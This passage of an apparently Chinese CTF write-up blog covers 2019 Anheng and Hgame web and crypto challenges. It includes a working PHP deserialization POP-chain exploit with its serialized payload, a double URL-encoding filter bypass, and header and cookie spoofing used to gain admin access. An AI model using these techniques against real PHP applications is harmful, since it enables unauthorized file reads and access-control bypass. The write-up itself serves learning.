class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>包含<code>flag.php</code>，那就是要读取其中的内容即可；发现了<code>unserialize()</code>，又是和php反序列化联系起来，由于还是萌新，所以还只是简单了解反序列化的东西，也就是知道几个魔术方法，从飘零学长的博客了解到是关于pop链的构造，对于pop链的构造一无所知，第一次使用，记录一下； </p>
<blockquote>
<p>以前理解的序列化攻击更多的是在魔术方法中出现一些利用的漏洞，因为自动调用从而触发漏洞。但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
</blockquote>
<p>问题具体分析：</p>
<ol>
<li>baby类三个变量：<code>skyobj,aaa,bbb</code>，两个魔术方法：<code>__construct(),__toString()</code>，反序列化时会自动调用；</li>
<li>其中<code>__construct()</code>定义<code>skyobj</code>是<code>sec类</code>的一个对象，sec类中会调用<code>read()</code>方法；</li>
<li>其中<code>__toString()</code>调用<code>skyobj</code>的<code>read()</code>方法；</li>
<li><code>cool</code>类中也是由<code>read()</code>方法的；</li>
</ol>
<p>关键代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</span><br><span class="line">&#123;</span><br><span class="line">    $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        </span><br><span class="line">    if (file_get_contents($file))         </span><br><span class="line">    &#123;              </span><br><span class="line">    	return file_get_contents($file); </span><br><span class="line">    &#125;  </span><br><span class="line">    else </span><br><span class="line">    &#123; </span><br><span class="line">    	return &quot;you must be joking!&quot;; </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>非常明显是满足<code>$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb</code>即可以读出文件内容，如果构造一个data，使得反序列化后自动调用魔术方法后，通过<code>if判断</code>语句，改变可控变量<code>$filename</code>即可读取到文件内容；</p>
<p><strong>solution1</strong></p>
<p>到这里思路就非常明显了：</p>
<ol>
<li>从调用<code>sec</code>的<code>read</code>方法改变为调用<code>cool</code>的<code>read</code>方法；</li>
<li>无需设置$amzing的值，即为NULL，则反序列化后的<code>$this-&gt;nice-&gt;aaa</code>和<code>$this-&gt;nice-&gt;bbb</code>都为NULL，即可成功通过if判断语句；</li>
</ol>
<p>构造exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();     <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=O:4:&quot;baby&quot;:3:&#123;s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;&#125;s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line">urlencode(data)=O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<p><img src="https://s2.ax1x.com/2019/02/23/khLLE6.png" alt="khLLE6.png"></p>
<p><strong>solution2</strong></p>
<p>这里的<code>$this-&gt;nice-&gt;aaa</code>被赋值为为止变量<code>$sth</code>，从飘零学长那里学习到另一种构造方法来通过if判断，即通过两个不同的变量名访问同一个内容，无论其中一个怎么变，另一个变量总是指向他现在的值，即可构造如下，：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line">$test-&gt;bbb=&amp;$test-&gt;aaa;</span><br></pre></td></tr></table></figure>
<p>exp1构造<code>$amzing</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();    <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line">$test-&gt;bbb=&amp;$test-&gt;aaa;    <span class="comment">//指向同一个地址</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$amzing=O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>baby%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>skyobj%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>cool%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nice%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>amzing%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>aaa%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>bbb%<span class="number">22</span>%<span class="number">3</span>BR%<span class="number">3</span>A6%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p><code>$amzing</code>反序列化后的<code>aaa</code>和<code>bbb</code>就相等了，这里就完成构造<code>$amzing</code>；</p>
<p>最终exp2：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();    <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line"><span class="comment">//$test-&gt;bbb=&amp;$test-&gt;aaa;</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>设置<code>$filename=&#39;flag.php&#39;</code>，设置<code>$amzing</code>即可；</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10009/index.php?data=O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>
<p>执行顺序分析：</p>
<ol>
<li>首先反序列化<code>$data</code>，得到一个baby类的对象；</li>
<li>默认调用魔术方法，即可调用<code>read</code>；</li>
<li>反序列化<code>$amzing</code>赋值给<code>$nice</code>，此时的<code>$nice-&gt;aaa</code>和<code>$nice-&gt;bbb</code>相等，可以通过if判断；</li>
<li>读文件<code>$test-&gt;skyobj-&gt;filename</code>；</li>
</ol>
<p><strong>参考链接：</strong><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">pop链构造</a>，<a href="https://skysec.top/2019/01/25/2019%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9BWriteip/" target="_blank" rel="noopener">飘零学长wp</a>，</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h3><p>百度到键盘之争：</p>
<p><img src="https://s2.ax1x.com/2019/02/24/k4vEff.png" alt="k4vEff.png"></p>
<p>对应到的键盘如下：</p>
<p><img src="https://s2.ax1x.com/2019/02/24/k4vM0s.png" alt="k4vM0s.png"></p>
<p>写个对应的列表，替换对应的字符，解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dic_1=[<span class="string">'q'</span>,<span class="string">'w'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'y'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'a'</span>,<span class="string">'s'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">';'</span>,<span class="string">'"'</span>,<span class="string">'z'</span>,<span class="string">'x'</span>,<span class="string">'c'</span>,<span class="string">'v'</span>,<span class="string">'b'</span>,<span class="string">'n'</span>,<span class="string">'m'</span>,<span class="string">'+'</span>,<span class="string">'_'</span>]</span><br><span class="line">dic_2=[<span class="string">'"'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'p'</span>,<span class="string">'y'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'c'</span>,<span class="string">'r'</span>,<span class="string">'l'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'e'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'d'</span>,<span class="string">'h'</span>,<span class="string">'t'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'_'</span>,<span class="string">';'</span>,<span class="string">'q'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'x'</span>,<span class="string">'b'</span>,<span class="string">'m'</span>,<span class="string">'&#125;'</span>,<span class="string">'&#123;'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    str0=<span class="string">'ypau_kjg;"g;"ypau+'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str0:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> dic_1:</span><br><span class="line">            num=dic_1.index(i)</span><br><span class="line">            res+=dic_2[num]</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<p><a href="https://imgchr.com/i/k4x65q" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/24/k4x65q.md.png" alt="k4x65q.md.png"></a></p>
<h1 id="杭电Hgame-2019-week1-WP"><a href="#杭电Hgame-2019-week1-WP" class="headerlink" title="杭电Hgame-2019-week1-WP"></a>杭电Hgame-2019-week1-WP</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h3><p>题目提示：vim，没好好关机，知道了是Linux的vim异常退出；</p>
<p>于是尝试访问<code>.index.html.swp</code>，成功下载swp文件，拖进十六进制编辑器查看得到flag：</p>
<p><img src="https://s2.ax1x.com/2019/02/13/k0X9Sg.png" alt="k0X9Sg.png"></p>
<h3 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h3><p>如下界面：</p>
<p><img src="https://s2.ax1x.com/2019/02/13/k0XM6J.png" alt="k0XM6J.png"></p>
<p>随便输入了内容提交得到提示：</p>
<p><img src="https://s2.ax1x.com/2019/02/13/k0XYtK.png" alt="k0XYtK.png"></p>
<p>提示需要POST，那就hackbar直接post一个值：</p>
<p><img src="https://s2.ax1x.com/2019/02/13/k0Xd6H.png" alt="k0Xd6H.png"></p>
<p>又来提示需要本地登录，那就加上<code>X-Forwarded-For</code>的请求头：</p>
<p><img src="https://s2.ax1x.com/2019/02/13/k0jnEt.png" alt="k0jnEt.png"></p>
<p>提示需要修改<code>User-Agent</code>，那就直接修改：</p>
<p><a href="https://imgchr.com/i/k0jwCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0jwCT.md.png" alt="k0jwCT.md.png"></a></p>
<p>又要求<code>the requests should referer from www.bilibili.com</code>，继续添加：</p>
<p><img src="https://s2.ax1x.com/2019/02/13/k0jB2F.png" alt="k0jB2F.png"></p>
<p>要求是管理员登录…有点无从下手，想了一下既然是换头大作战…查看请求头发现Cookie里有admin=0关键字，索性直接修改为1，payload如下：</p>
<p><img src="https://s2.ax1x.com/2019/02/13/k0jR56.png" alt="k0jR56.png"></p>
<p>得到flag：</p>
<p><img src="https://s2.ax1x.com/2019/02/13/k0jLIP.png" alt="k0jLIP.png"></p>
<h3 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h3><p>代码审计初体验：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">"vidar"</span>,$_GET[<span class="string">'id'</span>])!==<span class="keyword">FALSE</span>)</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"&lt;p&gt;干巴爹&lt;/p&gt;"</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'id'</span>] === <span class="string">"vidar"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>非常简单的url二次编码绕过，GET进来的id已经被urldecode一次了，代码意思是继续decode得到<code>vidar</code>；</p>
<p><strong>payload:</strong><code>http://120.78.184.111:8080/week1/very_ez/index.php?id=%2576%2569%2564%2561%2572</code></p>
<h3 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h3><p>查看源代码有提示：</p>
<p><img src="https://s2.ax1x.com/2019/02/13/k0xfje.png" alt="k0xfje.png"></p>
<p>查看响应头：</p>
<p><img src="https://s2.ax1x.com/2019/02/13/k0x7Nt.png" alt="k0x7Nt.png"></p>
<p>于是直接post一个password过去：</p>
<p><a href="https://imgchr.com/i/k0zC40" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zC40.md.png" alt="k0zC40.md.png"></a></p>
<p>点进去…说太快了：</p>
<p><a href="https://imgchr.com/i/k0zF3T" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zF3T.md.png" alt="k0zF3T.md.png"></a></p>
<p>那就抓个包试试…得到flag：</p>
<p><a href="https://imgchr.com/i/k0zkgU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zkgU.md.png" alt="k0zkgU.md.png"></a></p>
<h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Mix"><a href="#Mix" class="headerlink" title="Mix"></a>Mix</h3><blockquote>
<p>Description:</p>
<p>–…/….-/….-/-…/–…/…–/…../..-./-…./-../-…./..-./–…/—-./….-/….-/–…/.—-/-…./-…/–…/-…/-…./..—/…../.—-/-…./-…./…–/….-/…–/—–/-…./…../–…/-.. So easy</p>
</blockquote>
<p>看起来就是摩斯密码没错了，找个在线解密即可得到16进制，解码得到字符，凯撒移位后观察关键字母，栅栏移位即可得到flag；</p>
<h3 id="base全家"><a href="#base全家" class="headerlink" title="base全家"></a>base全家</h3><p><a href="https://imgchr.com/i/ko86FH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/ko86FH.md.png" alt="ko86FH.md.png"></a></p>
<p>我就不说了…呆了，解半天也没想到个好办法，python跑一下，既然是base全家桶系列，直接用异常处理即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=open(<span class="string">'cnm.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">p=f.read()</span><br><span class="line">n=<span class="string">''</span></span><br><span class="line">step=[]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b16decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b32decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b64decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> step</span><br></pre></td></tr></table></figure>
<p>python渣渣就不班门弄斧了…就是要注意base解码的顺序，必须从<code>16-&gt;32-&gt;64</code>，原因是部分base16和base32可以被base64解码…找到有意义的字符串如下：</p>
<p><a href="https://imgchr.com/i/koYhOx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/koYhOx.md.png" alt="koYhOx.md.png"></a></p>
<p>在线base58解密即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;40ca78cde14458da697066eb4cc7daf6&#125;</span><br></pre></td></tr></table></figure>
<h1 id="杭电Hgame-2019-week2-WP"><a href="#杭电Hgame-2019-week2-WP" class="headerlink" title="杭电Hgame-2019-week2-WP"></a>杭电Hgame-2019-week2-WP</h1><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><p>看见标题为<code>where is my robots</code>，访问<code>robots.txt</code>，发现一个访问路径<code>img/index.php</code>，访问到源码：</p>
